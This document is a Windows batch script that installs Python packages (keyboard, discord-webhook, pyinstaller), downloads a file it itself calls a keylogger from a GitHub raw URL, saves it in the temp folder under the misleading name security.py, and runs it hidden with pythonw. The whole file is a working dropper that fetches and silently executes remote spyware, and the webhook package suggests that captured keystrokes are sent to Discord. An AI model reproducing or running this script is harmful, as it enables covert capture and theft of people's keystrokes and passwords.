@echo off
:: Check if Python 3 is installed
python --version >nul 2>&1
IF ERRORLEVEL 1 (
    echo Python 3 is not installed. Please install Python 3 first.
    pause
    exit /b
)

:: Check if pythonw is available (it should come with Python on Windows)
where pythonw >nul 2>&1
IF ERRORLEVEL 1 (
    echo pythonw is not installed or not found in PATH. Please ensure Python is installed correctly.
    pause
    exit /b
) ELSE (
    echo pythonw is available.
)

:: Upgrade pip3
echo Upgrading pip3...
python -m pip install --upgrade pip

:: Install required packages using pip3
echo Installing required packages...
python -m pip install keyboard discord-webhook pyinstaller

:: Set the temp directory and define the path for the script
set TEMP_DIR=%TEMP%
set SCRIPT_PATH=%TEMP_DIR%\security.py

:: Download the Python script from GitHub and save it to the temp directory
echo Downloading the keylogger Python script from GitHub...
curl -o %SCRIPT_PATH% https://raw.githubusercontent.com/ashwanthcreators/Digispark/main/keylogger.py

IF ERRORLEVEL 1 (
    echo Failed to download the Python script. Ensure that curl is available and the link is correct.
    pause
    exit /b
) ELSE (
    echo Script downloaded successfully and saved as %SCRIPT_PATH%.
)

:: Execute the downloaded script using pythonw (no console window)
echo Executing security.py from the temp directory using pythonw...
pythonw %SCRIPT_PATH%

IF ERRORLEVEL 1 (
    echo Failed to execute the Python script. Please check for issues.
    pause
    exit /b
) ELSE (
    echo Script executed successfully.
)

:: Final message
echo All operations completed successfully.
pause
